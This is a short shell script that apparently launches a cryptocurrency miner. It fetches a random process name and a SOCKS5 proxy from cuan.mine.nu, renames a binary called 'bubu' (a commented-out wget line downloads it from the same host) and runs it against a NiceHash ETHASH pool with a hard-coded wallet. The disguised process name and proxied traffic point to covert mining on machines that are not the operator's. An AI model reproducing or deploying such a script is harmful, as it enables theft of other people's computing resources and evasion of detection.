#!/bin/sh
ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
#wget https://cuan.mine.nu/lol/bubu && chmod +x bubu
chmod +x bubu
mv bubu $ACAK
WALLET=3EGM4mZ5BL4dxDsZa1nKS5dXjMs1xnxADQ
POOL=daggerhashimoto.auto.nicehash.com:9200
PROXY=$(echo $(curl -s https://cuan.mine.nu/ganti.php))
WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
#WORKER2=$(date '+%d%b')
#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
./$ACAK --algo ETHASH --pool $POOL --socks5 $PROXY --user $WALLET.$WORKER1
